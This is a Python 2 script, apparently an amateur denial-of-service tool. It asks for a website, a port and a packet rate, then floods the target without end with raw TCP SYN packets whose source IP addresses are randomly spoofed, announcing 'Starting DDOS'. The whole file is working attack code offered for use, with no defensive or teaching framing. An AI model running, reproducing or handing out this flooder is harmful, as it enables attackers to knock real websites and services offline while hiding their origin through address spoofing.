import socket, sys
from struct import *
import random, threading, time

# checksum functions needed for calculation checksum
def checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
     
    s = (s>>16) + (s & 0xffff);
    #s = s + (s >> 16);
    #complement and mask to 4 byte short
    s = ~s & 0xffff
     
    return s

def get_random_ip():
    h = []
    for i in range(4):
        v = str(random.randint(0,255))
        h.append(v)
    return '.'.join(h)

#create a raw socket and take target input
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error , msg:
    print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
    
dest_ip = socket.gethostbyname(str(raw_input("Enter Website to attack: ")))
dest_port = int(raw_input("Enter a destination port (80 if you dont know what the f#ck a port is): "))
speed = float(raw_input("Enter a packet/sec rate: "))
real_source_port = random.randint(0,8192)



# tell kernel not to put in headers, since we are providing it
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)




def get_spoofed_packet():
    # now start constructing the packet
    packet = ''

    source_ip = get_random_ip()

    # ip header fields
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
    packet_id = random.randint(0,65535)  #Id of this packet
    frag_off = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    check = 10  # python seems to correctly fill the checksum
    saddr = socket.inet_aton(source_ip)  #Spoof the source ip address if you want to
    daddr = socket.inet_aton(dest_ip)

    ihl_version = (version << 4) + ihl

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, packet_id, frag_off, ttl, protocol, check, saddr, daddr)

    # tcp header fields
    source = random.randint(0,65535)   # source port
    dest = dest_port   # destination port
    seq = 0
    ack_seq = 0
    doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
    #tcp flags
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(5840)    #   maximum allowed window size
    check = 0
    urg_ptr = 0

    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    # the ! in the pack format string means network order
    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

    # pseudo header fields
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
    psh = psh + tcp_header;

    tcp_checksum = checksum(psh)

    # make the tcp header again and fill the correct checksum
    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)

    # final full packet - syn packets dont have any data
    packet = ip_header + tcp_header
    return packet

def packet_flood(packets_to_send):
    for i in range(int(packets_to_send)):
        spoofed_packet = get_spoofed_packet()
        s.sendto(spoofed_packet, (dest_ip , real_source_port))
        
def infinite_packet_flood():
    global speed
    rate = 1.0/speed
    global sent_packets
    sent_packets = 0
    while 5 > 4:
        try:
            spoofed_packet = get_spoofed_packet()
            s.sendto(spoofed_packet, (dest_ip , real_source_port))
            sent_packets += 1
            sys.stdout.write("\rSent "+str(sent_packets)+" packets to "+str(dest_ip)+"")
            sys.stdout.flush()
            time.sleep(rate)
        except KeyboardInterrupt:
            sys.stdout.write("\rSent a total of "+str(sent_packets)+" packets to "+str(dest_ip)+"\n")
            sys.stdout.write("                                               \n")
            break

print "Starting DDOS\n"

ddos = threading.Thread(target=infinite_packet_flood())
ddos.start()
